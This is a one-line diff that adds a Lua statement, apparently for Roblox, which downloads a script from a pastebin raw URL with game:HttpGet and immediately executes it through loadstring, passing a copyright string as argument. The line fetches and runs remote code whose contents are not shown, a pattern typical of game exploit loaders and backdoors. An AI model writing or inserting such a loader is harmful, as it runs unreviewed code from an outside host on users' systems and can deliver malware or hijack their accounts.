@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/FRJ4wpVb"))("Copyright ERROR_CODE ECCS Co")
